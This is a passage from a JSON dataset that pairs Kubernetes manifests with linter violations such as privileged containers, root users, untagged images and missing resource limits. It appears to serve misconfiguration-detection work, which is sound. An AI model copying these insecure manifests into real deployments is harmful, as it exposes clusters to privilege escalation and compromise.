    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flink-jobmanager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flink\n      component: jobmanager\n  template:\n    metadata:\n      labels:\n        app: flink\n        component: jobmanager\n    spec:\n      serviceAccountName: zep-flink-eks-kt-svcacct\n      containers:\n      - name: jobmanager\n        image: docker.io/kthyagar/ktflink\n        workingDir: /opt/flink\n        command:\n        - /bin/bash\n        - -c\n        - $FLINK_HOME/bin/jobmanager.sh start;while :; do if [[ -f $(find log -name\n          '*jobmanager*.log' -print -quit) ]]; then tail -f -n +1 log/*jobmanager*.log;\n          fi; done\n        env:\n        - name: blahblah\n          value: blahblah\n        - name: blahblah\n          value: blahblah\n        ports:\n        - containerPort: 6123\n          name: rpc\n        - containerPort: 6124\n          name: blob\n        - containerPort: 8081\n          hostPort: 8081\n          name: ui\n        livenessProbe:\n          tcpSocket:\n            port: 6123\n          initialDelaySeconds: 30\n          periodSeconds: 60\n        volumeMounts:\n        - name: flink-config-volume\n          mountPath: /opt/flink/conf\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: flink-config-volume\n        configMap:\n          name: flink-config\n          items:\n          - key: flink-conf.yaml\n            path: flink-conf.yaml\n          - key: log4j.properties\n            path: log4j.properties\n",
    "policy_id": "duplicate-env-var",
    "violation_text": "Duplicate environment variable blahblah in container \"jobmanager\" found"
  },
  {
    "id": "2737",
    "manifest_path": "data/manifests/the_stack_sample/sample_0766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flink-jobmanager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flink\n      component: jobmanager\n  template:\n    metadata:\n      labels:\n        app: flink\n        component: jobmanager\n    spec:\n      serviceAccountName: zep-flink-eks-kt-svcacct\n      containers:\n      - name: jobmanager\n        image: docker.io/kthyagar/ktflink\n        workingDir: /opt/flink\n        command:\n        - /bin/bash\n        - -c\n        - $FLINK_HOME/bin/jobmanager.sh start;while :; do if [[ -f $(find log -name\n          '*jobmanager*.log' -print -quit) ]]; then tail -f -n +1 log/*jobmanager*.log;\n          fi; done\n        env:\n        - name: blahblah\n          value: blahblah\n        - name: blahblah\n          value: blahblah\n        ports:\n        - containerPort: 6123\n          name: rpc\n        - containerPort: 6124\n          name: blob\n        - containerPort: 8081\n          hostPort: 8081\n          name: ui\n        livenessProbe:\n          tcpSocket:\n            port: 6123\n          initialDelaySeconds: 30\n          periodSeconds: 60\n        volumeMounts:\n        - name: flink-config-volume\n          mountPath: /opt/flink/conf\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: flink-config-volume\n        configMap:\n          name: flink-config\n          items:\n          - key: flink-conf.yaml\n            path: flink-conf.yaml\n          - key: log4j.properties\n            path: log4j.properties\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"jobmanager\" is using an invalid container image, \"docker.io/kthyagar/ktflink\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2738",
    "manifest_path": "data/manifests/the_stack_sample/sample_0766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flink-jobmanager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flink\n      component: jobmanager\n  template:\n    metadata:\n      labels:\n        app: flink\n        component: jobmanager\n    spec:\n      serviceAccountName: zep-flink-eks-kt-svcacct\n      containers:\n      - name: jobmanager\n        image: docker.io/kthyagar/ktflink\n        workingDir: /opt/flink\n        command:\n        - /bin/bash\n        - -c\n        - $FLINK_HOME/bin/jobmanager.sh start;while :; do if [[ -f $(find log -name\n          '*jobmanager*.log' -print -quit) ]]; then tail -f -n +1 log/*jobmanager*.log;\n          fi; done\n        env:\n        - name: blahblah\n          value: blahblah\n        - name: blahblah\n          value: blahblah\n        ports:\n        - containerPort: 6123\n          name: rpc\n        - containerPort: 6124\n          name: blob\n        - containerPort: 8081\n          hostPort: 8081\n          name: ui\n        livenessProbe:\n          tcpSocket:\n            port: 6123\n          initialDelaySeconds: 30\n          periodSeconds: 60\n        volumeMounts:\n        - name: flink-config-volume\n          mountPath: /opt/flink/conf\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: flink-config-volume\n        configMap:\n          name: flink-config\n          items:\n          - key: flink-conf.yaml\n            path: flink-conf.yaml\n          - key: log4j.properties\n            path: log4j.properties\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jobmanager\" does not have a read-only root file system"
  },
  {
    "id": "2739",
    "manifest_path": "data/manifests/the_stack_sample/sample_0766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flink-jobmanager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flink\n      component: jobmanager\n  template:\n    metadata:\n      labels:\n        app: flink\n        component: jobmanager\n    spec:\n      serviceAccountName: zep-flink-eks-kt-svcacct\n      containers:\n      - name: jobmanager\n        image: docker.io/kthyagar/ktflink\n        workingDir: /opt/flink\n        command:\n        - /bin/bash\n        - -c\n        - $FLINK_HOME/bin/jobmanager.sh start;while :; do if [[ -f $(find log -name\n          '*jobmanager*.log' -print -quit) ]]; then tail -f -n +1 log/*jobmanager*.log;\n          fi; done\n        env:\n        - name: blahblah\n          value: blahblah\n        - name: blahblah\n          value: blahblah\n        ports:\n        - containerPort: 6123\n          name: rpc\n        - containerPort: 6124\n          name: blob\n        - containerPort: 8081\n          hostPort: 8081\n          name: ui\n        livenessProbe:\n          tcpSocket:\n            port: 6123\n          initialDelaySeconds: 30\n          periodSeconds: 60\n        volumeMounts:\n        - name: flink-config-volume\n          mountPath: /opt/flink/conf\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: flink-config-volume\n        configMap:\n          name: flink-config\n          items:\n          - key: flink-conf.yaml\n            path: flink-conf.yaml\n          - key: log4j.properties\n            path: log4j.properties\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"zep-flink-eks-kt-svcacct\" not found"
  },
  {
    "id": "2740",
    "manifest_path": "data/manifests/the_stack_sample/sample_0766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flink-jobmanager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flink\n      component: jobmanager\n  template:\n    metadata:\n      labels:\n        app: flink\n        component: jobmanager\n    spec:\n      serviceAccountName: zep-flink-eks-kt-svcacct\n      containers:\n      - name: jobmanager\n        image: docker.io/kthyagar/ktflink\n        workingDir: /opt/flink\n        command:\n        - /bin/bash\n        - -c\n        - $FLINK_HOME/bin/jobmanager.sh start;while :; do if [[ -f $(find log -name\n          '*jobmanager*.log' -print -quit) ]]; then tail -f -n +1 log/*jobmanager*.log;\n          fi; done\n        env:\n        - name: blahblah\n          value: blahblah\n        - name: blahblah\n          value: blahblah\n        ports:\n        - containerPort: 6123\n          name: rpc\n        - containerPort: 6124\n          name: blob\n        - containerPort: 8081\n          hostPort: 8081\n          name: ui\n        livenessProbe:\n          tcpSocket:\n            port: 6123\n          initialDelaySeconds: 30\n          periodSeconds: 60\n        volumeMounts:\n        - name: flink-config-volume\n          mountPath: /opt/flink/conf\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: flink-config-volume\n        configMap:\n          name: flink-config\n          items:\n          - key: flink-conf.yaml\n            path: flink-conf.yaml\n          - key: log4j.properties\n            path: log4j.properties\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jobmanager\" is not set to runAsNonRoot"
  },
  {
    "id": "2741",
    "manifest_path": "data/manifests/the_stack_sample/sample_0766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flink-jobmanager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flink\n      component: jobmanager\n  template:\n    metadata:\n      labels:\n        app: flink\n        component: jobmanager\n    spec:\n      serviceAccountName: zep-flink-eks-kt-svcacct\n      containers:\n      - name: jobmanager\n        image: docker.io/kthyagar/ktflink\n        workingDir: /opt/flink\n        command:\n        - /bin/bash\n        - -c\n        - $FLINK_HOME/bin/jobmanager.sh start;while :; do if [[ -f $(find log -name\n          '*jobmanager*.log' -print -quit) ]]; then tail -f -n +1 log/*jobmanager*.log;\n          fi; done\n        env:\n        - name: blahblah\n          value: blahblah\n        - name: blahblah\n          value: blahblah\n        ports:\n        - containerPort: 6123\n          name: rpc\n        - containerPort: 6124\n          name: blob\n        - containerPort: 8081\n          hostPort: 8081\n          name: ui\n        livenessProbe:\n          tcpSocket:\n            port: 6123\n          initialDelaySeconds: 30\n          periodSeconds: 60\n        volumeMounts:\n        - name: flink-config-volume\n          mountPath: /opt/flink/conf\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: flink-config-volume\n        configMap:\n          name: flink-config\n          items:\n          - key: flink-conf.yaml\n            path: flink-conf.yaml\n          - key: log4j.properties\n            path: log4j.properties\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jobmanager\" has cpu request 0"
  },
  {
    "id": "2742",
    "manifest_path": "data/manifests/the_stack_sample/sample_0766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flink-jobmanager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flink\n      component: jobmanager\n  template:\n    metadata:\n      labels:\n        app: flink\n        component: jobmanager\n    spec:\n      serviceAccountName: zep-flink-eks-kt-svcacct\n      containers:\n      - name: jobmanager\n        image: docker.io/kthyagar/ktflink\n        workingDir: /opt/flink\n        command:\n        - /bin/bash\n        - -c\n        - $FLINK_HOME/bin/jobmanager.sh start;while :; do if [[ -f $(find log -name\n          '*jobmanager*.log' -print -quit) ]]; then tail -f -n +1 log/*jobmanager*.log;\n          fi; done\n        env:\n        - name: blahblah\n          value: blahblah\n        - name: blahblah\n          value: blahblah\n        ports:\n        - containerPort: 6123\n          name: rpc\n        - containerPort: 6124\n          name: blob\n        - containerPort: 8081\n          hostPort: 8081\n          name: ui\n        livenessProbe:\n          tcpSocket:\n            port: 6123\n          initialDelaySeconds: 30\n          periodSeconds: 60\n        volumeMounts:\n        - name: flink-config-volume\n          mountPath: /opt/flink/conf\n        securityContext:\n          runAsUser: 0\n      volumes:\n      - name: flink-config-volume\n        configMap:\n          name: flink-config\n          items:\n          - key: flink-conf.yaml\n            path: flink-conf.yaml\n          - key: log4j.properties\n            path: log4j.properties\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jobmanager\" has memory limit 0"
  },
  {
    "id": "2743",
    "manifest_path": "data/manifests/the_stack_sample/sample_0769.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nginx\nspec:\n  selector:\n    app: nginx\n  ports:\n  - protocol: TCP\n    port: 443\n    targetPort: 443\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nginx])"
  },
  {
    "id": "2744",
    "manifest_path": "data/manifests/the_stack_sample/sample_0770.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6472\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2745",
    "manifest_path": "data/manifests/the_stack_sample/sample_0770.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6472\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2746",
    "manifest_path": "data/manifests/the_stack_sample/sample_0770.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6472\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2747",
    "manifest_path": "data/manifests/the_stack_sample/sample_0770.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6472\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2748",
    "manifest_path": "data/manifests/the_stack_sample/sample_0770.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6472\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2749",
    "manifest_path": "data/manifests/the_stack_sample/sample_0772.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-privileged\nspec:\n  serviceAccountName: fake-user\n  containers:\n  - name: nginx-privileged\n    image: nginx:1.14.2\n    securityContext:\n      privileged: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-privileged\" does not have a read-only root file system"
  },
  {
    "id": "2750",
    "manifest_path": "data/manifests/the_stack_sample/sample_0772.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-privileged\nspec:\n  serviceAccountName: fake-user\n  containers:\n  - name: nginx-privileged\n    image: nginx:1.14.2\n    securityContext:\n      privileged: true\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"fake-user\" not found"
  },
  {
    "id": "2751",
    "manifest_path": "data/manifests/the_stack_sample/sample_0772.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-privileged\nspec:\n  serviceAccountName: fake-user\n  containers:\n  - name: nginx-privileged\n    image: nginx:1.14.2\n    securityContext:\n      privileged: true\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"nginx-privileged\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "2752",
    "manifest_path": "data/manifests/the_stack_sample/sample_0772.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-privileged\nspec:\n  serviceAccountName: fake-user\n  containers:\n  - name: nginx-privileged\n    image: nginx:1.14.2\n    securityContext:\n      privileged: true\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"nginx-privileged\" is privileged"
  },
  {
    "id": "2753",
    "manifest_path": "data/manifests/the_stack_sample/sample_0772.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-privileged\nspec:\n  serviceAccountName: fake-user\n  containers:\n  - name: nginx-privileged\n    image: nginx:1.14.2\n    securityContext:\n      privileged: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-privileged\" is not set to runAsNonRoot"
  },
  {
    "id": "2754",
    "manifest_path": "data/manifests/the_stack_sample/sample_0772.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-privileged\nspec:\n  serviceAccountName: fake-user\n  containers:\n  - name: nginx-privileged\n    image: nginx:1.14.2\n    securityContext:\n      privileged: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-privileged\" has cpu request 0"
  },
  {
    "id": "2755",
    "manifest_path": "data/manifests/the_stack_sample/sample_0772.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-privileged\nspec:\n  serviceAccountName: fake-user\n  containers:\n  - name: nginx-privileged\n    image: nginx:1.14.2\n    securityContext:\n      privileged: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-privileged\" has memory limit 0"
  },
  {
    "id": "2756",
    "manifest_path": "data/manifests/the_stack_sample/sample_0773.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selector-test-pod\n  labels:\n    name: selector-test-pod\n    unique-label: bingbang\nspec:\n  containers:\n  - name: kubernetes-pause\n    image: gcr.io/google-containers/pause:2.0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kubernetes-pause\" does not have a read-only root file system"
  },
  {
    "id": "2757",
    "manifest_path": "data/manifests/the_stack_sample/sample_0773.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selector-test-pod\n  labels:\n    name: selector-test-pod\n    unique-label: bingbang\nspec:\n  containers:\n  - name: kubernetes-pause\n    image: gcr.io/google-containers/pause:2.0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kubernetes-pause\" is not set to runAsNonRoot"
  },
  {
    "id": "2758",
    "manifest_path": "data/manifests/the_stack_sample/sample_0773.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selector-test-pod\n  labels:\n    name: selector-test-pod\n    unique-label: bingbang\nspec:\n  containers:\n  - name: kubernetes-pause\n    image: gcr.io/google-containers/pause:2.0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kubernetes-pause\" has cpu request 0"
  },
  {
    "id": "2759",
    "manifest_path": "data/manifests/the_stack_sample/sample_0773.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selector-test-pod\n  labels:\n    name: selector-test-pod\n    unique-label: bingbang\nspec:\n  containers:\n  - name: kubernetes-pause\n    image: gcr.io/google-containers/pause:2.0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kubernetes-pause\" has memory limit 0"
  },
  {
    "id": "2760",
    "manifest_path": "data/manifests/the_stack_sample/sample_0774.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: testchart2\n  labels:\n    chart: testchart2-0.1.0\n    namespace: testnamespace\n    release-name: testreleasename\n    release-is-upgrade: 'false'\n    release-is-install: 'true'\n    kube-version/major: '1'\n    kube-version/minor: '14'\n    kube-version/gitversion: v1.14.0\nspec:\n  type: ClusterIP\n  ports:\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n    name: nginx\n  selector:\n    app: testchart2\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:testchart2])"
  },
  {
    "id": "2761",
    "manifest_path": "data/manifests/the_stack_sample/sample_0776.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: istio-citadel\n  namespace: istio-system\n  labels:\n    app: security\n    chart: security\n    heritage: Tiller\n    release: istio\n    istio: citadel\nspec:\n  ports:\n  - name: grpc-citadel\n    port: 8060\n    targetPort: 8060\n    protocol: TCP\n  - name: http-monitoring\n    port: 15014\n  selector:\n    istio: citadel\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[istio:citadel])"
  },
  {
    "id": "2762",
    "manifest_path": "data/manifests/the_stack_sample/sample_0778.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: devopsapi-service\n  namespace: devops\n  labels:\n    app: devopsapi\nspec:\n  type: NodePort\n  selector:\n    app: devopsapi\n  ports:\n  - name: devopsapi-port\n    protocol: TCP\n    port: 10009\n    nodePort: 31850\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:devopsapi])"
  },
  {
    "id": "2763",
    "manifest_path": "data/manifests/the_stack_sample/sample_0779.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: plank\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20190920-d724a578b\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --skip-report=true\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"plank\" does not have a read-only root file system"
  },
  {
    "id": "2764",
    "manifest_path": "data/manifests/the_stack_sample/sample_0779.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: plank\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20190920-d724a578b\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --skip-report=true\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"plank\" is not set to runAsNonRoot"
  },
  {
    "id": "2765",
    "manifest_path": "data/manifests/the_stack_sample/sample_0779.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: plank\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20190920-d724a578b\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --skip-report=true\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"plank\" has cpu request 0"
  },
  {
    "id": "2766",
    "manifest_path": "data/manifests/the_stack_sample/sample_0779.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: plank\n  labels:\n    app: plank\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: plank\n  template:\n    metadata:\n      labels:\n        app: plank\n    spec:\n      containers:\n      - name: plank\n        image: gcr.io/k8s-prow/plank:v20190920-d724a578b\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --skip-report=true\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"plank\" has memory limit 0"
  },
  {
    "id": "2767",
    "manifest_path": "data/manifests/the_stack_sample/sample_0781.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgresql-db\nspec:\n  selector:\n    matchLabels:\n      app: postgresql-db\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: postgresql-db\n    spec:\n      securityContext:\n        fsGroup: 2000\n      initContainers:\n      - name: init-chmod-data\n        image: postgres\n        command:\n        - sh\n        - -c\n        args:\n        - chown -R 1001:2000 /data\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n      containers:\n      - name: postgresql-db\n        image: postgres\n        securityContext:\n          runAsUser: 1001\n          runAsGroup: 2000\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: stock-market-secret\n              key: postgres-password\n        - name: PGDATA\n          value: /data/pgdata\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"init-chmod-data\" is using an invalid container image, \"postgres\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2768",
    "manifest_path": "data/manifests/the_stack_sample/sample_0781.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgresql-db\nspec:\n  selector:\n    matchLabels:\n      app: postgresql-db\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: postgresql-db\n    spec:\n      securityContext:\n        fsGroup: 2000\n      initContainers:\n      - name: init-chmod-data\n        image: postgres\n        command:\n        - sh\n        - -c\n        args:\n        - chown -R 1001:2000 /data\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n      containers:\n      - name: postgresql-db\n        image: postgres\n        securityContext:\n          runAsUser: 1001\n          runAsGroup: 2000\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: stock-market-secret\n              key: postgres-password\n        - name: PGDATA\n          value: /data/pgdata\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"postgresql-db\" is using an invalid container image, \"postgres\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2769",
    "manifest_path": "data/manifests/the_stack_sample/sample_0781.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgresql-db\nspec:\n  selector:\n    matchLabels:\n      app: postgresql-db\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: postgresql-db\n    spec:\n      securityContext:\n        fsGroup: 2000\n      initContainers:\n      - name: init-chmod-data\n        image: postgres\n        command:\n        - sh\n        - -c\n        args:\n        - chown -R 1001:2000 /data\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n      containers:\n      - name: postgresql-db\n        image: postgres\n        securityContext:\n          runAsUser: 1001\n          runAsGroup: 2000\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: stock-market-secret\n              key: postgres-password\n        - name: PGDATA\n          value: /data/pgdata\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2770",
    "manifest_path": "data/manifests/the_stack_sample/sample_0781.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgresql-db\nspec:\n  selector:\n    matchLabels:\n      app: postgresql-db\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: postgresql-db\n    spec:\n      securityContext:\n        fsGroup: 2000\n      initContainers:\n      - name: init-chmod-data\n        image: postgres\n        command:\n        - sh\n        - -c\n        args:\n        - chown -R 1001:2000 /data\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n      containers:\n      - name: postgresql-db\n        image: postgres\n        securityContext:\n          runAsUser: 1001\n          runAsGroup: 2000\n        volumeMounts:\n        - name: postgresql-db-disk\n          mountPath: /data\n        env:\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: stock-market-secret\n              key: postgres-password\n        - name: PGDATA\n          value: /data/pgdata\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-chmod-data\" does not have a read-only root file system"
  },
  {
    "id": "2771",
    "manifest_path": "data/manifests/the_stack_sample/sample_0781.yaml",
